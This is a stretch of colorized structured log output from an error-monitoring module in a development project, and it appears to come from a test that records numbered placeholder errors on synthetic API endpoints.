WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779748Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1738'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779796Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1739'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779844Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1740'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779892Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1741'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779989Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1742'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780058Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1743'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780113Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1744'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780163Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1745'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780212Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1746'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780262Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1747'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780312Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1748'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780361Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1749'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780411Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1750'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780460Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1751'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780544Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1752'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780624Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1753'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780686Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1754'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780738Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1755'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780787Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1756'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780836Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1757'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780885Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1758'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780934Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1759'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.780983Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1760'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781033Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1761'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781083Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1762'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781133Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1763'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781181Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1764'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781231Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1765'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781279Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1766'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781327Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1767'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781375Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1768'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781424Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1769'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781471Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1770'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781520Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1771'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781568Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1772'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781617Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1773'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781665Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1774'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781714Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1775'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781762Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1776'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781811Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1777'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
